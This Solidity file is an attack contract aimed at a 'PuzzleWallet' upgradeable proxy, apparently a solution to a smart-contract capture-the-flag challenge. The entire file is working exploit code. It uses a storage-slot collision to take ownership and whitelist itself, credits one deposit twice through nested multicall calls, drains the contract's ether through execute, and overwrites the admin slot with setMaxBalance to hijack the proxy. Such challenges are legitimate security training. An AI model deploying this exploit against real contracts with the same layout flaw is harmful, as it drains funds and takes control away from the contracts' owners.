// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

abstract contract IPuzzleWallet {
  address public pendingAdmin;
  address public admin;
  mapping(address => bool) public whitelisted;
  mapping(address => uint256) public balances;

  function deposit() external payable virtual;

  function multicall(bytes[] calldata data) external payable virtual;

  function addToWhitelist(address _user) external virtual;

  function setMaxBalance(uint256 _maxBalance) external virtual;

  function execute(
    address _target,
    uint256 value,
    bytes calldata _data
  ) external payable virtual;
}

contract PuzzleWalletAttack {
  IPuzzleWallet public puzzleWallet;

  constructor(address _puzzleWallet) payable {
    puzzleWallet = IPuzzleWallet(_puzzleWallet);
  }

  function attack(address implementation) public payable {
    uint256 balance = address(puzzleWallet).balance;
    bool success;
    // Check Admin and PendingAdmin
    console.log("PendingAdmin: ", puzzleWallet.pendingAdmin());
    console.log("Admin: ", puzzleWallet.admin());
    // Change pendingAdmin("owner" in implementation) to this contract
    bytes memory data0 = abi.encodeWithSignature(
      "proposeNewAdmin(address)",
      address(this)
    );
    (success, ) = address(puzzleWallet).call(data0);
    require(success, "Failed to call proposeNewAdmin(address(this))");
    console.log("Called proposeNewAdmin(address(this)): ");

    // Check if PendingAdmin changed
    console.log("result: PendingAdmin changed ->", puzzleWallet.pendingAdmin());

    // Check that this contract is not whitelisted yet
    console.log("IsWhiteListed: ", puzzleWallet.whitelisted(address(this)));

    // Add this contract to whitelist
    bytes memory data1 = abi.encodeWithSignature(
      "addToWhitelist(address)",
      address(this)
    );
    (success, ) = address(puzzleWallet).call(data1);
    require(success, "Failed to call addToWhitelist(address(this))");
    console.log("Called addToWhitelist(address(this)): ");
    // Check if this contract is whitelisted
    console.log("IsWhiteListed: ", puzzleWallet.whitelisted(address(this)));

    // transfer 0.001 ether to this contract, but deposit() twice
    bytes[] memory data_inner = new bytes[](1);
    bytes[] memory data_outer = new bytes[](2);

    bytes memory data01 = abi.encodeWithSignature("deposit()");
    data_inner[0] = data01;

    bytes memory data02 = abi.encodeWithSignature(
      "multicall(bytes[])",
      data_inner
    );
    data_outer[0] = data01;
    data_outer[1] = data02;
    (success, ) = address(puzzleWallet).call{value: balance}(
      abi.encodeWithSignature("multicall(bytes[])", data_outer)
    );
    require(success, "Failed to call deposit()");
    console.log("Called deposit() twice: ");

    console.log("Proxy balance: ", address(puzzleWallet).balance);
    console.log("My balance: ", puzzleWallet.balances(address(this)));

    // Reduce balance to 0
    puzzleWallet.execute(address(this), balance * 2, "");
    console.log("Called execute");
    console.log("Proxy balance: ", address(puzzleWallet).balance);
    console.log("My balance: ", puzzleWallet.balances(address(this)));

    // Rewrite maxbalance to msg.sender, both maxBalance and admin use slot 1, so this will overwrite admin, which achieve out goal to hijak the contract
    bytes memory data3 = abi.encodeWithSignature(
      "setMaxBalance(uint256)",
      uint256(uint160(msg.sender))
    );

    (bool success3, ) = address(puzzleWallet).call(data3);
    require(success3, "Failed to call setBalance(address(this))");
    console.log("Called setMaxBalance");
  }

  receive() external payable {}
}
